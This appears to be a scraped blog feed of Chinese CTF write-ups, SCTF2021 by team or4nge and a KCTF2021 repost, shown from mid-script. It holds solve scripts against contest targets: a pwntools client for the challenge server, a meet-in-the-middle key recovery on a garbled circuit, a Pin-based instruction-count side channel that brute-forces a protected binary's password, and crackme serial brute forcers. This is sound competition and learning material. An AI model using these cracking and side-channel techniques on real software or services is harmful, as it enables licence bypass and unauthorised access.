target+=(\u0026#34;%c\u0026#34;%mpc[j]) target+=\u0026#34;\\n\u0026#34; open(\u0026#34;test.txt\u0026#34;,\u0026#34;w\u0026#34;).write(target) maxn=0 while (True): try: p=remote(\u0026#34;124.70.152.166\u0026#34;,1448) p.recvuntil(b\u0026#34;:\u0026#34;) p.send(b\u0026#34;Y\\n\u0026#34;) for i in range(4): p.recvuntil(b\u0026#34;\\n\u0026#34;) buffer=p.recvuntil(b\u0026#34;\\n\u0026#34;).decode()[:-2] _mp=list(map(int,buffer.split(\u0026#34; \u0026#34;))) mp0=[(0 if isprime(i) else 1) if i\u0026gt;0 else i for i in _mp] mp=[[mp0[i*20+j] for j in range(20)]for i in range(20)] mpback=[[mp0[i*20+j] for j in range(20)]for i in range(20)] bprint(mp) fprint(mp) data=os.popen(\u0026#39;./a.out test.txt\u0026#39;).read() print(data) p.send(data.encode()) p.recvuntil(\u0026#34;:\u0026#34;) p.send(b\u0026#34;Y\\n\u0026#34;) rec=p.recvuntil(\u0026#34;\\n\u0026#34;) print(rec) maxn=max(maxn,i+1) i=4 p.recvuntil(b\u0026#34;\\n\u0026#34;) buffer=p.recvuntil(b\u0026#34;\\n\u0026#34;).decode()[:-2] _mp=list(map(int,buffer.split(\u0026#34; \u0026#34;))) mp0=[(0 if isprime(i) else 1) if i\u0026gt;0 else i for i in _mp] mp=[[mp0[i*20+j] for j in range(20)]for i in range(20)] mpback=[[mp0[i*20+j] for j in range(20)]for i in range(20)] bprint(mp) fprint(mp) data=os.popen(\u0026#39;./a.out test.txt\u0026#39;).read() print(data) p.send(data.encode()) dt=p.recvuntil(b\u0026#34;Y\u0026#34;) print(\u0026#34;recieved:\u0026#34;,end=\u0026#39;\u0026#39;) print(dt) i=5 p.interactive() except: if (i==4): traceback.print_exc() if (i==5): break p.close() print(\u0026#34;maxn:%d\u0026#34;%maxn) pass Crypto ciruit map 是个混淆电路，目标 flag 最终就是要求出 keys\n电路中多给了一个值是 validation，用这个值可以构造中间相遇攻击，从而将秘钥爆破空间缩小到 2**24，pypy3 跑然后在密钥空间中验证电路是否能通，能通的就是正确的秘钥\nfrom block_cipher import encrypt_data, decrypt_data, decrypt from collections import defaultdict from tqdm import tqdm G_Table = { 5: [(13303835, 2123830), (2801785, 11303723), (13499998, 248615), (13892520, 7462011)], 6: [(3244202, 918053), (3277177, 6281266), (1016382, 7097624), (10016472, 13600867)], 7: [(5944875, 3442862), (7358369, 8423543), (6495696, 9927178), (13271900, 11855272)], 9: [(5333988, 87113), (9375869, 11687470), (5011062, 14981756), (2509493, 12330305)]} print(\u0026#39;[!] generating lookup table...\u0026#39;) ENCRYPTIONS_OF_ZERO = defaultdict(list) for key in tqdm(range(2**24)): ct = encrypt_data(0, key) ENCRYPTIONS_OF_ZERO[ct].append(key) def meet_in_the_middle(ct): print(\u0026#39;[!] performing meet-in-the-middle attack for\u0026#39;, ct) possible = defaultdict(list) for key in tqdm(range(2**24)): dec = decrypt_data(ct, key) if dec in ENCRYPTIONS_OF_ZERO: possible[key] = ENCRYPTIONS_OF_ZERO[dec] return possible def recover_keys(Z, C): print(\u0026#39;[!] recovering keys...\u0026#39;) z1, z2, z3, z4 = Z c1, c2, c3, c4 = C for b0 in tqdm(z1): for a0 in z1[b0]: p1 = decrypt(c1, a0, b0) for c,z in zip([c2, c3, c4], [z2, z3, z4]): for a1 in z[b0]: if p1 == decrypt(c, a1, b0): b1 = recover_keys_part2(Z, C, a0, b0) if b1: print(c1) print(c) print(f\u0026#39;a0 = {a0}, b0 = {b0}\u0026#39;) print(f\u0026#39;a1 = {a1}, b1 = {b1}\u0026#39;) return True return False def recover_keys_part2(Z, C, a0, b0): z1, z2, z3, z4 = Z c1, c2, c3, c4 = C for c,z in zip([c2,c3,c4], [z2,z3,z4]): for b1 in z: if a0 in z[b1] and decrypt(c, a0, b1) == decrypt(c1, a0, b0): return b1 return False # Z是四个字典，键是key2, 值是key1 for i in [7]: Z = [meet_in_the_middle(G_Table[i][j][1]) for j in range(4)] C = [g[0] for g in G_Table[i]] for i in range(4): if recover_keys([Z[i]] + Z[:i] + Z[i+1:], [C[i]] + C[:i] + C[i+1:]): break ############################################################### from block_cipher import decrypt G_Table = { 5: [(13303835, 2123830), (2801785, 11303723), (13499998, 248615), (13892520, 7462011)], 6: [(3244202, 918053), (3277177, 6281266), (1016382, 7097624), (10016472, 13600867)], 7: [(5944875, 3442862), (7358369, 8423543), (6495696, 9927178), (13271900, 11855272)], 9: [(5333988, 87113), (9375869, 11687470), (5011062, 14981756), (2509493, 12330305)]} def validate_the_circuit(geta_table, key0, key1): for g in geta_table: gl, v = g label = decrypt(gl, key0, key1) validation = decrypt(v, key0, key1) if validation == 0: return label geta5 = G_Table[5] geta6 = G_Table[6] geta7 = G_Table[7] geta9 = G_Table[9] key0 = 8680011 key1 = 2096572 msg = validate_the_circuit(geta9, key0, key1) print(\u0026#39;key[9][1] = \u0026#39;, msg) # keys[1][0] = 8343801 # keys[1][1] = 13675268 # keys[2][0] = 10251687 # keys[2][1] = 12870274 # keys[3][0] = 6827786 # keys[3][1] = 12490757 # keys[4][0] = 2096572 # keys[4][1] = 3391233 # keys[5][0] = 15707475 # keys[5][1] = 4567418 # keys[6][0] = 14095476 # keys[6][1] = 3648155 # key[7][0] = 14409690 # key[7][1] = 8680011 # key[9][0] = 9376523 # key[9][1] = 2504390 ############################################################### import hashlib from Crypto.Util.number import * from libnum import n2s # keys[1][0] = 8343801 # keys[1][1] = 13675268 # keys[2][0] = 10251687 # keys[2][1] = 12870274 # keys[3][0] = 6827786 # keys[3][1] = 12490757 # keys[4][0] = 2096572 # keys[4][1] = 3391233 # keys[5][0] = 15707475 # keys[5][1] = 4567418 # keys[6][0] = 14095476 # keys[6][1] = 3648155 # keys[7][0] = 14409690 # keys[7][1] = 8680011 # keys[9][0] = 9376523 # keys[9][1] = 2504390 keys = [[8343801, 13675268], [10251687, 12870274], [6827786, 12490757], [2096572, 3391233], [15707475, 4567418], [14095476, 3648155], [14409690, 8680011], [9376523, 2504390]] def xor(A, B): return bytes(a ^ b for a, b in zip(A, B)) the_chaos=b\u0026#39;\u0026#39; for i in keys: tmp = sum(i) the_chaos += bytes(long_to_bytes(tmp)) mask = hashlib.md5(the_chaos).digest() flag = xor(mask,n2s(0x1661fe85c7b01b3db1d432ad3c5ac83a)) print(flag) Misc This_is_A_tree 一个树型解密，随便找了个脚本改了改\n#!/usr/bin/python  # -*- coding:utf8 -*-  import os allFileNum = 0 file_contents_list = [] def printPath(level, path): global allFileNum # 所有文件夹，第一个字段是次目录的级别  dirList = [] # 所有文件  fileList = [] # exp global file_contents_list # exp # 返回一个列表，其中包含在目录条目的名称(google翻译)  files = os.listdir(path) # 先添加目录级别  dirList.append(str(level)) for f in files: if(os.path.isdir(path + \u0026#39;/\u0026#39; + f)): # 排除隐藏文件夹。因为隐藏文件夹过多  if(f[0] == \u0026#39;.\u0026#39;): pass else: # 添加非隐藏文件夹  dirList.append(f) if(os.path.isfile(path + \u0026#39;/\u0026#39; + f)): # 添加文件 fileList.append(f) # exp添加内容 if f != \u0026#39;exp.py\u0026#39;: file_contents_list.append(open(path + \u0026#39;\\\\\u0026#39; + f, \u0026#39;r\u0026#39;).read()) # exp # 当一个标志使用，文件夹列表第一个级别不打印  i_dl = 0 for dl in dirList: if(i_dl == 0): i_dl = i_dl + 1 else: # 打印至控制台，不是第一个的目录  print(\u0026#39;-\u0026#39; * (int(dirList[0])), dl) # 打印目录下的所有文件夹和文件，目录级别+1  printPath((int(dirList[0]) + 1), path + \u0026#39;/\u0026#39; + dl) for fl in fileList: # 打印文件  print(\u0026#39;-\u0026#39; * (int(dirList[0])), fl) # 随便计算一下有多少个文件  allFileNum = allFileNum + 1 return file_contents_list if __name__ == \u0026#39;__main__\u0026#39;: contents_list = printPath(1, \u0026#39;D:\\\\CTF题目\\\\2021SCTF\\\\misc\\\\78afbe21e9334e83a265e984a1aa9ddd\u0026#39;) # print(\u0026#39;总文件数 =\u0026#39;, allFileNum) print(\u0026#34;\u0026#34;.join(contents_list)) 解密完base64一下是个八卦序列，师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫 https://blog.csdn.net/weixin_44110537/article/details/107494966\n脚本如下,输入换一下，删一点后面的就行\ndef decrypt4(enc): temp=\u0026#39;\u0026#39; offset=5 for i in range(len(enc)): temp+=chr(ord(enc[i])+offset+i) return temp def decrypt5(flag): for a in range(1,200): enc = \u0026#39;\u0026#39; for i in flag: for k in range(200): if (ord(i) - 97 - 7+26*k)%a==0: enc+= chr((ord(i) - 97 - 7 + 26 * k) // a + 97) break print(enc) s=\u0026#39;师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫\u0026#39; dic={\u0026#39;坤\u0026#39;: \u0026#39;000000\u0026#39;, \u0026#39;剥\u0026#39;: \u0026#39;000001\u0026#39;, \u0026#39;比\u0026#39;: \u0026#39;000010\u0026#39;, \u0026#39;观\u0026#39;: \u0026#39;000011\u0026#39;, \u0026#39;豫\u0026#39;: \u0026#39;000100\u0026#39;, \u0026#39;晋\u0026#39;: \u0026#39;000101\u0026#39;, \u0026#39;萃\u0026#39;: \u0026#39;000110\u0026#39;, \u0026#39;否\u0026#39;: \u0026#39;000111\u0026#39;, \u0026#39;谦\u0026#39;: \u0026#39;001000\u0026#39;, \u0026#39;艮\u0026#39;: \u0026#39;001001\u0026#39;, \u0026#39;蹇\u0026#39;: \u0026#39;001010\u0026#39;, \u0026#39;渐\u0026#39;: \u0026#39;001011\u0026#39;, \u0026#39;小过\u0026#39;: \u0026#39;001100\u0026#39;, \u0026#39;旅\u0026#39;: \u0026#39;001101\u0026#39;, \u0026#39;咸\u0026#39;: \u0026#39;001110\u0026#39;, \u0026#39;遁\u0026#39;: \u0026#39;001111\u0026#39;, \u0026#39;师\u0026#39;: \u0026#39;010000\u0026#39;, \u0026#39;蒙\u0026#39;: \u0026#39;010001\u0026#39;, \u0026#39;坎\u0026#39;: \u0026#39;010010\u0026#39;, \u0026#39;涣\u0026#39;: \u0026#39;010011\u0026#39;, \u0026#39;解\u0026#39;: \u0026#39;010100\u0026#39;, \u0026#39;未济\u0026#39;: \u0026#39;010101\u0026#39;, \u0026#39;困\u0026#39;: \u0026#39;010110\u0026#39;, \u0026#39;讼\u0026#39;: \u0026#39;010111\u0026#39;, \u0026#39;升\u0026#39;: \u0026#39;011000\u0026#39;, \u0026#39;蛊\u0026#39;: \u0026#39;011001\u0026#39;, \u0026#39;井\u0026#39;: \u0026#39;011010\u0026#39;, \u0026#39;巽\u0026#39;: \u0026#39;011011\u0026#39;, \u0026#39;恒\u0026#39;: \u0026#39;011100\u0026#39;, \u0026#39;鼎\u0026#39;: \u0026#39;011101\u0026#39;, \u0026#39;大过\u0026#39;: \u0026#39;011110\u0026#39;, \u0026#39;姤\u0026#39;: \u0026#39;011111\u0026#39;, \u0026#39;复\u0026#39;: \u0026#39;100000\u0026#39;, \u0026#39;颐\u0026#39;: \u0026#39;100001\u0026#39;, \u0026#39;屯\u0026#39;: \u0026#39;100010\u0026#39;, \u0026#39;益\u0026#39;: \u0026#39;100011\u0026#39;, \u0026#39;震\u0026#39;: \u0026#39;100100\u0026#39;, \u0026#39;噬嗑\u0026#39;: \u0026#39;100101\u0026#39;, \u0026#39;随\u0026#39;: \u0026#39;100110\u0026#39;, \u0026#39;无妄\u0026#39;: \u0026#39;100111\u0026#39;, \u0026#39;明夷\u0026#39;: \u0026#39;101000\u0026#39;, \u0026#39;贲\u0026#39;: \u0026#39;101001\u0026#39;, \u0026#39;既济\u0026#39;: \u0026#39;101010\u0026#39;, \u0026#39;家人\u0026#39;: \u0026#39;101011\u0026#39;, \u0026#39;丰\u0026#39;: \u0026#39;101100\u0026#39;, \u0026#39;离\u0026#39;: \u0026#39;101101\u0026#39;, \u0026#39;革\u0026#39;: \u0026#39;101110\u0026#39;, \u0026#39;同人\u0026#39;: \u0026#39;101111\u0026#39;, \u0026#39;临\u0026#39;: \u0026#39;110000\u0026#39;, \u0026#39;损\u0026#39;: \u0026#39;110001\u0026#39;, \u0026#39;节\u0026#39;: \u0026#39;110010\u0026#39;, \u0026#39;中孚\u0026#39;: \u0026#39;110011\u0026#39;, \u0026#39;归妹\u0026#39;: \u0026#39;110100\u0026#39;, \u0026#39;睽\u0026#39;: \u0026#39;110101\u0026#39;, \u0026#39;兑\u0026#39;: \u0026#39;110110\u0026#39;, \u0026#39;履\u0026#39;: \u0026#39;110111\u0026#39;, \u0026#39;泰\u0026#39;: \u0026#39;111000\u0026#39;, \u0026#39;大畜\u0026#39;: \u0026#39;111001\u0026#39;, \u0026#39;需\u0026#39;: \u0026#39;111010\u0026#39;, \u0026#39;小畜\u0026#39;: \u0026#39;111011\u0026#39;, \u0026#39;大壮\u0026#39;: \u0026#39;111100\u0026#39;, \u0026#39;大有\u0026#39;: \u0026#39;111101\u0026#39;, \u0026#39;夬\u0026#39;: \u0026#39;111110\u0026#39;, \u0026#39;乾\u0026#39;: \u0026#39;111111\u0026#39;} li=[] k=0 for i in range(len(s)): if k ==1: k=0 continue try: li.append(dic[s[i]]) except: t=\u0026#39;\u0026#39; t=t+s[i]+s[i+1] li.append(dic[t]) k=1 ss=\u0026#39;\u0026#39;.join(li) print(ss) enc=\u0026#39;\u0026#39; for i in range(0,len(ss),8): enc+=chr(eval(\u0026#39;0b\u0026#39;+ss[i:i+8])) import base64 print(enc) x=base64.b64decode(enc).decode() print(x) x=decrypt4(x) x=decrypt5(x) fumo_xor_cli nc 远程发现是通过五颜六色的字符打印出一个 gif，肉眼发现有两帧不一样，把 nc 到的字节流重定向到本地文件，然后手动把这两帧提取出来，都是 50*133 个字符的。\n\r\n无意间发现链接的公众号推送的最后一张图有异样，下载原图，仔细观察发现：\n\r\n有规律的藏有五颜六色的像素，提取出来，发现是 133*100 的，把这个拆成两个 50*133 ，然后都旋转为正的，将 4 张 50*133 的图异或，发现大部分都是 (0,0,0)，部分是三个一样的，再经过一些简单的图片处理，得到flag。\n\r\n全程处理数据的脚本：\nfrom PIL import Image import numpy as np def rerange(s): t = [] for i in range(len(s[0])): t.append([s[_][i] for _ in range(len(s))]) return t f = Image.open(\u0026#39;640.png\u0026#39;) a = np.array(f) cnt = 0 wx_list_1 = [] wx_list_2 = [] for i in range(len(a)): if i % 9 == 1 and i \u0026lt; 1190: b = a[i] now_list_1 = [] now_list_2 = [] cnt_j = 0 for j in range(len(b)): if j % 9 == 1: if cnt_j \u0026lt; 50: now_list_1.append(b[j]) else: now_list_2.append(b[j]) cnt_j += 1 wx_list_1.append(now_list_1) wx_list_2.append(now_list_2) cnt += 1 wx_list_1 = rerange(wx_list_1) wx_list_2 = rerange(wx_list_2) import re fp = open(\u0026#39;pic1.txt\u0026#39;, \u0026#39;rb\u0026#39;) list_1 = [] for line in fp.readlines(): pattern = re.compile(r\u0026#39;\\[\\d+;\\d+;(\\d+);(\\d+);(\\d+)ma\u0026#39;) a = pattern.findall(line.decode()) a = [(int(_[0]), int(_[1]), int(_[2])) for _ in a] list_1.append(a) fp.close() fp = open(\u0026#39;pic2.txt\u0026#39;, \u0026#39;rb\u0026#39;) list_2 = [] for line in fp.readlines(): pattern = re.compile(r\u0026#39;\\[\\d+;\\d+;(\\d+);(\\d+);(\\d+)m[a-zA-Z0-9\\:\\/\\.\\_]\u0026#39;) a = pattern.findall(line.decode()) a = [(int(_[0]), int(_[1]), int(_[2])) for _ in a] list_2.append(a) fp.close() fp = open(\u0026#39;pic3\u0026#39;, \u0026#39;wb\u0026#39;) for i in range(len(list_1)): a, b = wx_list_1[i], list_1[i] c, d = wx_list_2[i], list_2[i] for j in range(len(a)): r1, g1, b1 = a[j] r2, g2, b2 = b[j] r3, g3, b3 = c[j] r4, g4, b4 = d[j] r0 = r2 ^ r1 ^ r3 ^ r4 g0 = g2 ^ g1 ^ g3 ^ g4 b0 = b2 ^ b1 ^ b3 ^ b4 if r0 != 0: r0, b0, g0 = 255, 255, 255 # # c0 = chr(ord(c1) ^ ord(c2)) payload = \u0026#39;[38;2;%d;%d;%dm▇\u0026#39; % (r0, g0, b0) fp.write(b\u0026#39;\\x1b\u0026#39; + payload.encode()) fp.write(\u0026#39;\\n\u0026#39;.encode()) in_the_vaporwaves 用国赛的华为音响播放（应该是个非预期）直接听到了莫斯码，录音下来的结果\n\r\n摩斯码：\n.../-.-./-/..-./-.././.../.----/.-./...--/..--.-/-../.-./../...-/./.../..--.-/../-./-/-----/..--.-/...-/.-/.--./---/.-./.--/.--.-./...-/./... 解莫斯码得到flag\nlow_re vmp 壳，根据题目描述，应该无法逆向出正确的逻辑，什么信息都没有的情况下想到用 pintools 来试试，手动尝试发现长度是 17 位，并且指令数量差异很明显\n按位爆破：\nimport subprocess import string password = \u0026#34;S1deCh4nnelAtt@ck\u0026#34; cur = 17 charset = string.digits + string.ascii_letters + string.punctuation for i in charset: command = \u0026#34;echo \u0026#34; + password[:cur] + i + password[cur + 1:] + \u0026#34; | ./pin.exe -t source/tools/ManualExamples/obj-intel64/inscount0.dll -- ./low_re.exe; cat inscount.out\u0026#34; output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) print (password[:cur] + i, output) 指令数量差异很明显，可以直接猜测单词加快速度\n\r\n","date":"2021-12-28T16:23:17+08:00","image":"https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/cover_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/","title":"SCTF2021 Writeup by or4nge"},{"content":"转载自战队成员博客: https://s0uthwood.github.io/post/two-challenges-in-kctf2021-fall/\n第一题 签到 这题还是比较容易的，需要一点点动调的经验\n上张队友的截图吧，懒得自己截了\n\r\n动调看看内存就知道，流程是：\nserial-\u0026gt;十进制-\u0026gt;与name的crc异或-\u0026gt;计算crc\n最后需要是一个固定的值，于是只需要想办法反解就行了\n这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束\n由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了\n接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了\n 靠记忆写的，希望没错\n 第二题 迷失丛林  这题就直接放提交的wp了\n 很容易定位到程序的输入\n\r\n输入长度为32，需要通过 sub_4014A0, sub_401580 的验证\n4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}\n随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580\n要想让该函数返回1，需要先通过如下的if验证\n\r\n简单看一下使用的变量，应该是对前八字节的输入进行的验证\n\r\n结合动调发现大概就是根据404000数组，构成一个 \u0026lt;value, index\u0026gt; 的结构，两两存放到404420当中\n分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!=40320$ 种可能，完全可以爆破\n把ida代码复制下来改一改\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;algorithm\u0026gt;#include \u0026lt;cstring\u0026gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp  unsigned char *v3; // eax  int *v4; // esi  unsigned char *v5; // ecx  int v6; // edi  unsigned char *v7; // ecx  int v8; // edx  unsigned char *v9; // eax  int v10; // ecx  int v11; // esi  int v12; // eax  unsigned char v13; // dl  int v14; // edi  int v15; // eax  int v16; // ecx  int v17; // esi  int i; // eax  char v19; // dl  unsigned char v21; // [esp+10h] [ebp-Ch]  unsigned char v22; // [esp+11h] [ebp-Bh]  unsigned char v23; // [esp+12h] [ebp-Ah]  unsigned char v24; // [esp+13h] [ebp-9h]  unsigned char *v25; // [esp+14h] [ebp-8h]  v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i \u0026lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = \u0026amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h  if ( *v4 \u0026gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 \u0026lt; \u0026amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 \u0026lt; 256 ); v9 = \u0026amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 \u0026amp;\u0026amp; v22 == 0xAC \u0026amp;\u0026amp; v23 == 0xA7 \u0026amp;\u0026amp; v24 \u0026gt; 0xC8u ){ for (i = 0; i \u0026lt; 8; i++){ printf(\u0026#34;%hhX\u0026#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } 转换一下得到前八字节 B4D682C8BF2DE13A\n确定前八字节后，只需要关注和参数（后八字节）有关的部分了，中间全部动调跳过\n\r\n这一部分程序相较来说就简单了不少，主要是根据404000开头的八个字节作为初始值，每个字节单独与输入的八个字节进行运算，根据末尾bit决定是+1还是找索引，最终目的是凑成 GoodJob~ 这个字符串（sub_4024C0 是个字符串比较）\n可以使用搜索之类的，但考虑到每个字节是单独运算的，常规爆破也只需要 0x800 的运算量，所以还是直接爆破了\n#include \u0026lt;stdio.h\u0026gt; unsigned char byte_414420[] = {0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21}; unsigned char byte_404000[] = { 0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21, 0x74, 0xEB, 0x14, 0xBF, 0xDF, 0x25, 0x5A, 0x37, 0x85, 0x2C, 0xAF, 0x8C, 0xDA, 0x26, 0xE2, 0x7A, 0x87, 0x4C, 0x60, 0x99, 0x54, 0x3C, 0x95, 0xC0, 0xB9, 0x0C, 0xBC, 0x0E, 0xE7, 0x2D, 0x86, 0xBE, 0x67, 0xD3, 0xD8, 0xFC, 0x30, 0xB6, 0xC8, 0x57, 0x1E, 0x62, 0x3E, 0xCE, 0xA0, 0xCD, 0xF5, 0xEE, 0xA7, 0xCF, 0x45, 0xFE, 0xD0, 0x80, 0x05, 0xAD, 0x13, 0xF3, 0xB7, 0x6B, 0x22, 0x2B, 0xBD, 0x69, 0x42, 0x4B, 0xA5, 0xEA, 0xA6, 0xD2, 0x6F, 0x4F, 0x4E, 0x07, 0xE1, 0x36, 0x01, 0xB5, 0xAA, 0xB1, 0x94, 0x0B, 0x35, 0x3A, 0xC7, 0x49, 0x53, 0x82, 0xC3, 0x7B, 0x32, 0xFF, 0x19, 0xC4, 0xF1, 0xC9, 0xE8, 0xF7, 0x56, 0x15, 0xA3, 0x46, 0x89, 0x43, 0x9D, 0x8F, 0x20, 0xEF, 0xBB, 0x2A, 0xCB, 0x09, 0x93, 0x4A, 0x1C, 0xE3, 0x33, 0xD1, 0xE0, 0x1D, 0x72, 0x7C, 0x27, 0xE9, 0x17, 0x28, 0x6D, 0x6A, 0xD9, 0x00, 0x9A, 0xE5, 0x63, 0xDE, 0x23, 0x9F, 0x0D, 0x47, 0x3B, 0x65, 0x08, 0x84, 0x6C, 0x1A, 0x88, 0x12, 0xA1, 0xA4, 0xB3, 0x18, 0x24, 0x1B, 0xD7, 0x44, 0xDB, 0xAC, 0x6E, 0x7D, 0x51, 0x5E, 0xED, 0x50, 0xD6, 0x11, 0x5B, 0x9C, 0xB4, 0x68, 0x3D, 0x2F, 0x03, 0x40, 0xBA, 0x2E, 0xCA, 0x02, 0xE6, 0xA8, 0xEC, 0x83, 0x06, 0x5D, 0xB8, 0x4D, 0x97, 0x66, 0xF0, 0xFB, 0x8A, 0x55, 0xAB, 0xB2, 0x04, 0xFA, 0x0A, 0x31, 0x71, 0xCC, 0x8B, 0x73, 0xA9, 0x48, 0x5C, 0xF9, 0x98, 0xE4, 0xC6, 0x34, 0xC5, 0x7E, 0x81, 0x75, 0x90, 0x1F, 0x92, 0x3F, 0x9E, 0x10, 0x29, 0x52, 0x39, 0xF4, 0x41, 0x78, 0x5F, 0x16, 0x79, 0xC2, 0xB0, 0xDD, 0xF2, 0x61, 0x0F, 0x70, 0xD4, 0x91, 0xDC, 0xF6, 0xF8, 0xFD, 0x59, 0x38, 0x8D, 0x96, 0xAE, 0x8E, 0x76, 0xA2 }; int calc(unsigned char a2, int i){ int v17; // esi  char v19; // dl  v17 = 0; do { if ( v17 \u0026gt;= 8 ) { if ( !i || i == 7 ) --byte_414420[i]; } else { if ( (a2 \u0026amp; 1) != 0 ) v19 = byte_414420[i] + 1; else v19 = byte_404000[byte_414420[i]]; byte_414420[i] = v19; a2 \u0026gt;\u0026gt;= 1; } ++v17; } while ( v17 \u0026lt; 9 ); return byte_414420[i]; } int main(){ int i = 0; unsigned char a = 0; unsigned char b[] = \u0026#34;GoodJob~\u0026#34;; for (int j = 0; j \u0026lt; 8; j++){ for (i = 0; i \u0026lt; 0x100; i++){ a = i \u0026amp; 0xff; for (int k = 0; k \u0026lt; 8; k++){ byte_414420[k] = byte_404000[k]; } calc(a, j); if (byte_414420[j] == b[j]) printf(\u0026#34;%d %x\\n\u0026#34;, j, a); } } return 0; } 最后得到下半段验证码 D9B6AEF24A80CB22\n第七题 声名远扬  这题做完后懒了，没有交wp\n 初步分析了一下，看到一些字符串，发现这题用了 duilib 架构\n很多人的 wp 写的是用虚表找到验证函数，但我对虚表不太了解，做题的时候是用的动调下断点的方式做的\n动调的时候搜索字符串，发现能找到输入，然后在输入处下个硬件断点，能够断到 strlen，出来后还能看到 strncpy，但在这里断是不对的，因为没有点击检查，所以无论如何也进不了验证函数，于是朋友在获取消息的地方加了个消息断点，这时候再用硬件断点断下来，然后不断取消当前断点，在 strncpy 到的地方下新的断点，就能够进入到加密函数\n\r\n这个 base64 